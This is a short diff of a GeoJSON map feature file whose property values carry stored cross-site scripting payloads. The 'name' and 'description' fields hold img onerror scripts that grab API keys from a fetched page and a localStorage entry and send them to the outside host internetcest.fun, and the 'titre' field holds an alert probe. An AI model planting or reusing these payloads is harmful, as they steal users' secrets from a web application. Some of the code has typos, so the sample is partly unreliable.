@@ -6,7 +6,8 @@
             "properties": {
                 "name": "<img src=x onerror=\"document.onmousemove=function(){fetch('/mescles').then(r=>r.text()).then(d=>{var m=d.match(/apikey.{0,100}/g);if(m){for(vari=0;i<m.length;i++){(new Image()).src='https: //internetcest.fun/?k='+encodeURIComponent(m[i])}}});document.onmousemove=null}\">Name",
                 "description": "<img src=x onerror=\"var t=localStorage.getItem('service');if(t){for(var i=0;i<t.length;i+=500){var p=encodeURIComponent(t.slice(i,i+500));(new Image()).src='https: //internetcest.fun/?i='+i+'&d='+p}}\">Description",
-                "titre": "<img src=x onerror=alert(1)>Titre"
+                "titre": "<img src=x onerror=alert(1)>Titre",
+                "image": "<b>/resources/geoportail-waiting.gif</b>"
         },
         "geometry": {
             "type": "LineString",
